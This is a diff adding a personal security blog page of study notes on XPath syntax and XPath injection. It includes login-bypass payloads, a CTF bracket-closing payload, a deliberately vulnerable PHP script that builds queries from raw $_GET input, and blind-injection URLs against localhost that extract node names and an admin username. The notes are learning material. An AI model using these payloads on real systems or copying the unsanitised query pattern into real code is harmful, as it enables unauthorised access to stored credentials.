@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        Threezh1&#39;Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            了解Xpath
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <!--Table of Contents begin-->
+        
+            <div id="toc" class="toc-article">
+            <strong class="toc-title">目录</strong>
+            <a class="js-toggle-toc" href="javascript:void(0)"></a>
+            <div class="toc-content">
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Simple-note"><span class="toc-text">Simple note</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XPath-Injection"><span class="toc-text">XPath Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Practice"><span class="toc-text">Practice</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#01"><span class="toc-text">01</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#02"><span class="toc-text">02</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#03"><span class="toc-text">03</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#04"><span class="toc-text">04</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DIG"><span class="toc-text">DIG</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tips"><span class="toc-text">Tips</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-text">Reference</span></a></li></ol>
+            </div>
+            </div>
+        
+        <!--Table of Contents end -->
+        <p>Learn : <a target="_blank" rel="noopener" href="http://www.w3school.com.cn/xpath/index.asp">http://www.w3school.com.cn/xpath/index.asp</a></p>
+<h2 id="Simple-note"><a href="#Simple-note" class="headerlink" title="Simple note"></a>Simple note</h2><p>Xpath is a languaga to find information in XML.</p>
+<p>There are knowledge too much, I don’t want to copy.</p>
+<p>Chose node:</p>
+<a id="more"></a>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">bookstore		chose all children_parameters.</span><br><span class="line">&#x2F;bookstore		chose root element bookstore.</span><br><span class="line">&#x2F;bookstore&#x2F;book	chose all children_paremeters named &quot;root&quot; of bookstore.</span><br><span class="line">&#x2F;&#x2F;book 			chose all children_parameters no matter where they are.</span><br><span class="line">bookstore&#x2F;&#x2F;book chose all children_paremeters named &quot;root&quot; of bookstore no matter where they are.</span><br><span class="line">&#x2F;&#x2F;@lang 		chose all attribute named &quot;lang&quot;.</span><br><span class="line"></span><br><span class="line">&#x2F;bookstore&#x2F;book[1]</span><br><span class="line">&#x2F;bookstore&#x2F;book[last()]</span><br><span class="line">&#x2F;bookstore&#x2F;book[last()-1]</span><br><span class="line">&#x2F;bookstore&#x2F;book[position()&lt;3]</span><br><span class="line">&#x2F;&#x2F;title[@lang]</span><br><span class="line">&#x2F;&#x2F;title[@lang&#x3D;&#39;eng&#39;]</span><br><span class="line">&#x2F;bookstore&#x2F;book[price&gt;35.00]</span><br><span class="line">&#x2F;bookstore&#x2F;book[price&gt;35.00]&#x2F;title</span><br><span class="line"></span><br><span class="line">*		ALL node.</span><br><span class="line">@*		ALL node which have any attribute.</span><br><span class="line">node()	ALL type of node.</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;book&#x2F;title | &#x2F;&#x2F;book&#x2F;price</span><br><span class="line">&#x2F;&#x2F;title | &#x2F;&#x2F;price</span><br><span class="line">&#x2F;bookstore&#x2F;book&#x2F;title | &#x2F;&#x2F;price</span><br></pre></td></tr></table></figure>
+
+<p>USE:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var xmlDoc&#x3D;new XMLHttpRequest()</span><br><span class="line"></span><br><span class="line">Chose nodes:</span><br><span class="line">IE : xmlDoc.selectNodes(xpath);</span><br><span class="line">Other : xmlDoc.evaluate(xpath, xmlDoc, null, XPathResult.ANY_TYPE,null);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="XPath-Injection"><a href="#XPath-Injection" class="headerlink" title="XPath Injection"></a>XPath Injection</h2><p>A example:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">users</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">firstname</span>&gt;</span>Ben<span class="tag">&lt;/<span class="name">firstname</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">lastname</span>&gt;</span>Elmore<span class="tag">&lt;/<span class="name">lastname</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">loginID</span>&gt;</span>abc<span class="tag">&lt;/<span class="name">loginID</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">password</span>&gt;</span>test123<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">firstname</span>&gt;</span>Shlomy<span class="tag">&lt;/<span class="name">firstname</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">lastname</span>&gt;</span>Gantz<span class="tag">&lt;/<span class="name">lastname</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">loginID</span>&gt;</span>xyz<span class="tag">&lt;/<span class="name">loginID</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">password</span>&gt;</span>123test<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>A website use XML to store the username and password. There is his normal query statement:</p>
+<p>Query basic statement:</p>
+<p><code>//user/user[loginID/text()=&#39;abc&#39; and password/text()=&#39;test123&#39;]</code></p>
+<p>Only if loginID and password is correct the user can get the result.</p>
+<p>If Input loginID and password = <code>&#39;&#39; or 1=1</code> , the hacker can bypass the veryfication.</p>
+<p><code>//users/user[LoginID/text()=&#39;&#39;or 1=1 and password/text()=&#39;&#39;or 1=1]</code></p>
+<p>So, XPath injection just like SQL, try to use some evil statement to get all content in XML.</p>
+<h3 id="Practice"><a href="#Practice" class="headerlink" title="Practice"></a>Practice</h3><h4 id="01"><a href="#01" class="headerlink" title="01"></a>01</h4><p>Use the Reference 1 to practice:</p>
+<p>Request = <a target="_blank" rel="noopener" href="http://localhost/test.php?name=admin&#39;">http://localhost/test.php?name=admin&#39;</a> or ‘1’=’1&amp;pwd</p>
+<p>xpath=<code>/root/users/user[username/text()=&#39;admin&#39; or &#39;1&#39;=&#39;1&#39; and password/text()=&#39;d41d8cd98f00b204e9800998ecf8427e&#39;]</code></p>
+<p>If you don’t know the username, you can use tow “or” to bypass the verification logic.</p>
+<p><code>http://localhost/test.php?name=fake&#39; or &#39;1&#39;or&#39;1&amp;pwd=fake</code></p>
+<p>It will return all username.</p>
+<h4 id="02"><a href="#02" class="headerlink" title="02"></a>02</h4><p>This is a CTF.</p>
+<p>It filter all sql injection statement, So we should use xpath to inject.</p>
+<p>This is important statement: <code>$query=&quot;user/username[@name=&#39;&quot;.$user.&quot;&#39;]&quot;;</code></p>
+<p>We can structure <code>user=&#39;]//*|anyword[</code></p>
+<p>First , we close the [] and then we use <code>//*</code> to get all username.</p>
+<h4 id="03"><a href="#03" class="headerlink" title="03"></a>03</h4><p>A example of use XPath with PHP:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">peo</span> <span class="attr">name</span>=<span class="string">&#x27;vk&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">subject</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">foo</span>&gt;</span>english<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">score</span>&gt;</span>100<span class="tag">&lt;/<span class="name">score</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">subject</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">subject</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">foo</span>&gt;</span>chinese<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">score</span>&gt;</span>100<span class="tag">&lt;/<span class="name">score</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">subject</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>vk123<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">peo</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_exists(<span class="string">&#x27;score.xml&#x27;</span>))&#123;</span><br><span class="line">        <span class="variable">$xml</span> = simplexml_load_file(<span class="string">&#x27;score.xml&#x27;</span>);  <span class="comment">//获取xml文件里面的数据</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">                <span class="variable">$user</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"></span><br><span class="line">                <span class="comment">//构造语句</span></span><br><span class="line">                <span class="variable">$en_scr</span> = <span class="string">&quot;//peo[@name=&#x27;<span class="subst">&#123;$user&#125;</span>&#x27;]/subject[contains(foo, &#x27;english&#x27;)]/score&quot;</span>;</span><br><span class="line">                <span class="variable">$ch_scr</span> = <span class="string">&quot;//peo[@name=&#x27;<span class="subst">&#123;$user&#125;</span>&#x27;]/subject[contains(foo, &#x27;chinese&#x27;)]/score&quot;</span>;</span><br><span class="line">                <span class="variable">$en_qu</span> = <span class="variable">$xml</span> -&gt; xpath(<span class="variable">$en_scr</span>);</span><br><span class="line">                <span class="variable">$ch_qu</span> = <span class="variable">$xml</span> -&gt; xpath(<span class="variable">$ch_scr</span>);</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable">$en_qu</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="variable">$user</span>.<span class="string">&#x27;:&lt;br&gt;english is &#x27;</span>.<span class="variable">$value</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable">$ch_qu</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="string">&#x27;chinese is &#x27;</span>.<span class="variable">$value</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;only have three user: vk, tom, helen.&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>$en_scr = &quot;//peo[@name=&#39;&#123;$user&#125;&#39;]/subject[contains(foo, &#39;english&#39;)]/score&quot;;</code></p>
+<p>Get the peo of the attribute name=user and then find the score of the child element whose foo is english in the subject.</p>
+<p>Bypass: <code>name=tom&#125;&#39;] | //* | //*[&#39;&#123;</code></p>
+<h4 id="04"><a href="#04" class="headerlink" title="04"></a>04</h4><p>XPath blind injection:</p>
+<p>Because I haven’t the enough example, so I just learn the thought of how to use it in easy way.</p>
+<p>Use the code of example 01.</p>
+<ol>
+<li>Judge the nodes’ number of root.</li>
+</ol>
+<p><code>127.0.0.1/xpath/index.php?name=1&#39; or count(/*)=1 or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p>
+<ol start="2">
+<li>Guess the first node.</li>
+</ol>
+<p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(name(/*[position()=1]),1,1)=&#39;r&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p>
+<p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(name(/*[position()=1]),2,1)=&#39;o&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p>
+<p>…</p>
+<p>result : root</p>
+<ol start="3">
+<li>Judge the number of next node of root:</li>
+</ol>
+<p><code>127.0.0.1/xpath/index.php?name=1&#39; or count(/root/*)=2 or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p>
+<ol start="4">
+<li>Guess the net node of root:</li>
+</ol>
+<p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(name(/root/*[position()=1]),1,1)=&#39;u&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p>
+<p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(name(/root/*[position()=2]),1,1)=&#39;s&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p>
+<p>…</p>
+<p>result: users,secret</p>
+<p>Guess the value of username which id = 1:</p>
+<p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(/root/users/user[id=1]/username,1,1)=&#39;a&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p>
+<p>…</p>
+<p>result: admin</p>
+<h2 id="DIG"><a href="#DIG" class="headerlink" title="DIG"></a>DIG</h2><p>If a website use XML to store privacy information and use XPath to control it and there haven’t waf to statement of input. So there is a XPath injection.</p>
+<p>A lack of example. Maybe the vulunery is difficult to meet.</p>
+<h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><p>or and = |</p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/8554749.html">xpath注入详解</a></li>
+</ul>
+
+    </div>
+
+    
+</div>
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 Threezh1
+        <!-- <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
+            <input type="checkbox" name="switch" id="update_style">
+            <span class="el-switch-style"></span>
+        </label> -->
+<!--         <script type="text/javascript">
+        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+        </script> -->
+    </p>
+</div>
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
